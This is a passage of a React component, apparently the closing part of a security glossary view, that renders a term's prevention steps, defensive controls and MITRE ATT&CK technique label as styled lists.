                      <ul className="list-disc list-inside space-y-1 text-slate-300 pl-1">
                        {selectedTermDetail.prevention.map((p: string, idx: number) => (
                          <li key={idx}>{p}</li>
                        ))}
                      </ul>
                    </div>
                  )}

                  {selectedTermDetail.defense && (
                    <div className="space-y-1.5">
                      <span className="font-mono font-bold text-emerald-400 block">
                        Defensive Controls:
                      </span>
                      <ul className="list-disc list-inside space-y-1 text-slate-300 pl-1">
                        {selectedTermDetail.defense.map((d: string, idx: number) => (
                          <li key={idx}>{d}</li>
                        ))}
                      </ul>
                    </div>
                  )}

                  {selectedTermDetail.mitre_technique && (
                    <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs">
                      <span className="text-slate-500">MITRE ATT&CK: </span>
                      <span className="text-cyan-300 font-bold">
                        {selectedTermDetail.mitre_technique}
                      </span>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
